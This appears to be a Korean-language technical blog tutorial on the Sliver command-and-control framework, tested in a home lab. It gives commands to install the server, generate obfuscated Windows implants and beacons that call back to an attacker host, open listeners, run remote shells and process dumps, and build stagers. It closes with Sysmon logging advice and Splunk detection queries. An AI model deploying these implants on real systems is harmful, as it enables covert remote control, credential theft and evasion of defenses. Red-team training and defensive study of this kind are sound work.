---
title: ["Sliver"]
date: 2025-09-22 09:00:00 +0900
last_modified_at: 2025-09-22 09:00:00 +0900
categories: [techniques, C2]
tags: [C2, exploitation]
---

Sliver는 Bishop Fox에서 만든 오픈소스 C2 프레임워크로, 레드팀, 펜테스터들에게 주로 사용된다.  

주요 특징:  
- 서버/클라이언트/임플란트가 Windows/macOS/Linux를 지원. 임플란트는 Go 기반으로 다양한 아키텍처에서 빌드 가능
- mTLS, HTTPS/HTTP, DNS, WireGuard 등 다양한 채널을 통해 통신 가능
- per-binary X.509, 동적 페이로드 생성, 인메모리 실행, 프로세스 인젝션, 멀티플레이 모드 등 다양한 보안·은닉 기능을 제공

테스트 OS: Kali Linux

---

## Installation
### 1. 크로스 컴파일을 위한 패키지 설치
```bash
sudo apt-get update
sudo apt-get install -y build-essential mingw-w64 binutils-mingw-w64 g++-mingw-w64
```

### 2. 최신 릴리스 확인 및 바이너리 설치
one-liner 설치 스크립트도 존재하지만, 블라인드 파이프 실행은 지양한다.  
```bash
# 최신 릴리스의 서버/클라이언트 URL만 뽑기
curl -s https://api.github.com/repos/BishopFox/sliver/releases/latest \
 | jq -r '.assets[] | .browser_download_url' \
 | grep -E '(sliver-server_linux|sliver-client_linux)$'

# 설치 
sudo wget -O /usr/local/bin/sliver-server https://github.com/BishopFox/sliver/releases/download/v1.5.43/sliver-server_linux
sudo chmod 755 /usr/local/bin/sliver-server

sudo wget -O /usr/local/bin/sliver https://github.com/BishopFox/sliver/releases/download/v1.5.43/sliver-client_linux
sudo chmod 755 /usr/local/bin/sliver
```

### 3. 자산 언팩
`~/.sliver/`에 전용 Go toolchain, obfuscation 도구 등이 언팩된다.
```bash
sliver-server unpack --force
```

### 4. systemd 서비스로 등록
`/etc/systemd/system/sliver.service`를 아래 내용으로 생성:
```ini
[Unit]
Description=Sliver
After=network.target
StartLimitIntervalSec=0

[Service]
Type=simple
Restart=on-failure
RestartSec=3
User=root
ExecStart=/usr/local/bin/sliver-server daemon

[Install]
WantedBy=multi-user.target
```

적용/기동:
```bash
sudo chmod 600 /etc/systemd/system/sliver.service
sudo systemctl daemon-reload
sudo systemctl enable --now sliver
```

리스닝 확인:
```bash
sudo netstat -antp | grep 31337
```

### 5. Operator 프로파일 발급
서버 쪽에서 **로컬 접속용** 운영자 자격 발급:
```bash
sliver-server operator --name attacker --lhost 127.0.0.1 --save /tmp
```
생성된 `attacker_127.0.0.1.cfg`에는 CA cert / 클라이언트 key-cert / 토큰이 포함된다.

### 6. 클라이언트에 프로파일 설치 및 접속
```bash
mkdir -p /home/kali/.sliver-client/configs
mv /tmp/attacker_127.0.0.1.cfg /home/kali/.sliver-client/configs/
chown -R kali:kali /home/kali/.sliver-client

# 클라이언트로 접속
└─$ sliver
? Select a server: attacker@127.0.0.1 (b129c3110fda8c59)
Connecting to 127.0.0.1:31337 ...

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain persist
[*] Server v1.5.43 - e116a5ec3d26e8582348a29cfd251f915ce4a405
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command
```

### Troubleshooting
Operator 프로파일을 생성할 때, `--lhost`를 `localhost`로 지정하면 오류가 나는 경우가 있다.  
`localhost`가 시스템에서 `::1`(IPv6)으로 해석되어 클라이언트가 IPv6 우선으로 연결을 시도했고, Sliver 서버에서 IPv4(127.0.0.1)에서만 수신 중이라면, 타임아웃(`context deadline exceeded`)이 난다.  
설정 편의를 위해 `--lhost 127.0.0.1`을 추천한다.  

---

## Connection
두 가지 종류의 연결 방식이 있다.
1. Session
- 타겟과 Sliver 서버 간에 **지속적인 연결**을 유지
- 실시간 interaction에 유리한 방식
- 네트워크에 항상 트래픽이 있어 탐지 가능성이 높음
2. Beacon
- 타겟이 정해진 주기마다 live하다는 신호를 서버에 보내고, 그때마다 새로운 명령이 있는지 확인
- 탐지 가능성이 낮지만, 명령 실행의 딜레이가 있음.

### Implant 생성
1. Session implant  
    ```bash
    sliver > generate --mtls 192.168.0.197 --os windows --arch amd64 --format exe

    [*] Generating new windows/amd64 implant binary
    [*] Symbol obfuscation is enabled
    [*] Build completed in 13s
    [*] Implant saved to /home/kali/ASSISTANT_SURROUND.exe
    ```  
    - `--mtls`: 전송 프로토콜
    - `192.168.0.197`: Sliver 서버 IP
    - `--os windows`: Windows용 payload 생성
    - `--arch amd64`: CPU 아케틱처 (default: amd64)
    - `--format exe`: 실행파일 (default: exe)

2. Beacon implant
    ```bash
    sliver > generate beacon --mtls 192.168.0.197 --os windows --seconds 10 --jitter 3
    ```
    - `--seconds 10`: 비콘 인터벌 타임 (default: 60, `--minutes`, `--hours`, `--days`도 가능)
    - `--jitter 3`: 랜덤 딜레이 값 (default: 30)

### Implant 실행
```bash
sliver > mtls

[*] Starting mTLS listener ...
[*] Successfully started job #1
```
서버에서 `mtls`를 실행하여 리스너를 오픈한다.  

생성된 implant를 타겟 PC에서 실행하면(Delivery 과정은 생략), 세션이 잡히는 것을 확인할 수 있다.  
```bash
[*] Session f8c93e97 ASSISTANT_SURROUND - 192.168.0.174:52616 (DESKTOP-DIE7A63) - windows/amd64 - Wed, 22 Sep 2025 09:49:59 EDT
```

### Session 사용
`use` 명령어를 이용하여, 활성화된 세션이나 비콘을 선택한다.  
핵심 명령어:
- `shell` : 인터랙티브 셸 실행
- `execute`: 원격에서 프로그램 실행
- `upload` / `download`: 파일 전송
- `screenshot`: 화면 캡처
- `procdump`: 프로세스 메모리 덤프
- `sideload` / `spawndll`: DLL 로드 / reflective 로딩
- `portfwd` / `rportfwd` / `socks5`: 네트워크 포워징, 프록시
- `reconfig` / `interactive` / `background`: 동적 설정 관리
  
```bash
sliver > use

? Select a session or beacon: SESSION  f8c93e97  ASSISTANT_SURROUND  192.168.0.174:52616  DESKTOP-DIE7A63  DESKTOP-DIE7A63\user  windows/amd64
[*] Active session ASSISTANT_SURROUND (f8c93e97-df00-4010-b758-f1e79720933a)

sliver (ASSISTANT_SURROUND) > info

        Session ID: f8c93e97-df00-4010-b758-f1e79720933a
              Name: ASSISTANT_SURROUND
          Hostname: DESKTOP-DIE7A63
              UUID: 95604d56-738b-cd06-d4cd-34184480e52e
          Username: DESKTOP-DIE7A63\user
               UID: S-1-5-21-76215697-3573545289-4026730203-1001
               GID: S-1-5-21-76215697-3573545289-4026730203-513
               PID: 12080
                OS: windows
           Version: 10 build 22631 x86_64
            Locale: en-GB
              Arch: amd64
         Active C2: mtls://192.168.0.197:8888
    Remote Address: 192.168.0.174:52616
         Proxy URL: 
Reconnect Interval: 1m0s
     First Contact: Wed Sep 22 09:49:59 EDT 2025 (1m13s ago)
      Last Checkin: Wed Sep 22 09:49:59 EDT 2025 (1m13s ago)
```

### 백그라운드 실행과 세션 제거
해당 세션에서 작업이 끝나면 `background`를 실행한다.  
```bash
sliver (ASSISTANT_SURROUND) > background

[*] Background ...

sliver >  
```

세션을 제거하고 싶다면, `sessions -k <ID>`를 실행한다.
```bash
sliver > sessions

 ID         Transport   Remote Address        Hostname          Username    Operating System   Health  
========== =========== ===================== ================= =========== ================== =========
 f8c93e97   mtls        192.168.0.174:52616   DESKTOP-DIE7A63   user        windows/amd64      [ALIVE]                                                                                              

sliver > sessions -k f8c93e97

[!] Lost session f8c93e97 ASSISTANT_SURROUND - 192.168.0.174:52616 (DESKTOP-DIE7A63) - windows/amd64 - Wed, 22 Sep 2025 10:12:18 EDT
```

---

## C2 Protocols
### 1. mTLS (mutual TLS)
Sliver가 자체적으로 사용하는 TLS 기반 전송  
임플란트와 C2가 서로 인증서를 교환해서 암호화된 채널을 만든다.  
TLS 트래픽으로 위장하면서 인증 기반 보안을 유지하며, HTTPS와 유사한 handshake를 활용해 전송 계층 은닉과 인증을 동시에 얻는다.  

### 2. WireGuard
임플란트가 WireGuard 기반의 VPN 터널을 생성해 C2와 L3 수준에서 직접 통신하는 방식  
내부망 리소스에 대한 피벗이 필요하거나, 임플란트가 가상 NIC를 열어 내부 IP로 라우팅해야 할 때 유용하다. (WireGuard 위에서 SOCKS 같은 리버스 프록시 기능도 제공된다.)  

### 3. HTTP / HTTPS
표준 HTTP(S)를 사용해 C2 체크인과 명령 전송을 하는 방식  
프록시, 인터셉션 환경에서도 작동할 수 있게 설계되어 있고, 정상 웹 트래픽으로 섞어쓰기 쉽다.  

### 4. DNS
DNS 쿼리/응답을 통해 소량의 데이터를 주고받는 방식  
쿼리 서브도메인에 페이로드 데이터를 실어 보내고, 권한이 있는 네임서버가 그 응답을 돌려준다. Sliver는 DNS C2를 지원하며, authoritative name 서버 구성과 함께 사용된다.  
제한된 환경(프록시, 필터링 등)에서 신호를 주고받아야 할 때 사용되지만, 전송량이 작기 때문에 기능에 제약이 있고, HTTP/HTTPS 대비 운영이 까다롭다.  

| Transport      | Sliver 옵션 예시                                                       | 특징 / 장점                                        | 사용 시점                                             |
| -------------- | ---------------------------------------------------------------------- | -------------------------------------------------- | ----------------------------------------------------- |
| **mTLS**       | `generate --mtls <IP:443>`                                             | TLS 기반 상호 인증, 암호화 기본 제공, HTTPS와 유사 | 외부 인터넷 환경, 웹 트래픽에 섞어 은닉할 때          |
| **WireGuard**  | `generate --wg <IP>`                                                   | VPN 터널(L3) 생성, 내부망 피벗/라우팅 용이         | 내부 리소스 접근, lateral movement 필요할 때          |
| **HTTP/HTTPS** | `generate --http <domain>`<br>`https --domain <domain> --lets-encrypt` | 정상 웹 요청처럼 위장 가능, 프록시/필터 우회 쉬움  | 기업 환경, 웹 트래픽 많은 네트워크에서 위장 필요할 때 |
| **DNS**        | `generate --dns <domain>`                                              | DNS 쿼리/응답 채널 이용, 소량 데이터 전송          | 제한적 네트워크, 웹/포트 차단된 환경에서 신호 전송    |

---

## Stager
Stager는 임플란트를 직접 실행하지 않고, 더 작은 로더를 먼저 실행시켜 이후 실제 임플란트를 내려받고 실행하도록 하는 **중간 단계** 코드  
- Sliver 기본 제공 Stagers
  - 간단한 stager payload를 자동 생성할 수 있음
  - 지정된 transport(mTLS, HTTP, DNS 등)를 통해 임플란트를 가져옴
- Custom Stager
  - Sliver 구조를 따르지 않고, 직접 커스텀한 C/C++/C# 코드로 임플란트를 내려받도록 만들 수 있음
  - 예: 단순 HTTP 요청으로 바이너리를 받아 메모리에 적재하는 코드

```bash
# 프로파일 생성
sliver > profiles new --mtls <domain> --format shellcode --arch amd64 sample

# 스테이지 리스너 시작 시 프로파일 지정
sliver > stage-listener --url tcp://<domain>:8443 --profile sample

# 스테이저 생성(프로파일 규칙에 맞게)
sliver > generate stager --lhost <domain> --lport 8443 --arch amd64 --format c --save /tmp
```

### Defense Strategy
이러한 프로세스 인젝션 기반 공격은 **(1) 초기 실행 흔적(프로세스 생성, 파일 드롭퍼)**와 **(2) 인젝션 행위(원격 스레드 생성, DLL reflective load, 메모리 상 코드 실행)**에서 흔적을 찾을 수 있다.  

#### 필수 로깅 설정
1. Sysmon
   - EventID 1: Process Creation
   - EventID 3: Network Connection
   - EventID 7: Image Loaded
   - EventID 8: CreateRemoteThread
   - EventID 10: PrecessAccess
   - EventID 11: FileCreate

2. PowerShell / CommandLine 로깅
   - PowerShell: ScriptBlockLogging, ModuleLogging, 로깅된 커맨드라인 수집 활성화
   - Windows CommandLine 인자 수집(EMBEDDED ARGs) 활성화
  
3. EDR / NGAV
   - 프로세스 인젝션 및 메모리 실행 의심행위에 대한 실시간 차단 규칙 구성

4. 네트워크 패킷 캡처
   - 장기 연결(장시간 TLS), 비정상 UDP 터널링 등을 모니터링할 수 있게 네트워크 패킷 로그 보관 주기를 길게 설정

#### 간단한 탐지 예시
- 프로세스 생성에서 비정상 부모/자식 찾기:
  ```sql
  index=sysmon EventCode=1 
  | where ParentImage NOT IN ("C:\\Windows\\explorer.exe","C:\\Windows\\services.exe") 
  | table _time, ComputerName, User, ParentImage, Image, CommandLine
  ```

- CreateRemoteThread 빈도 체크:
  ```sql
  index=sysmon EventCode=8 
  | stats count by ComputerName, TargetImage, SourceImage 
  | where count > 0
  ```

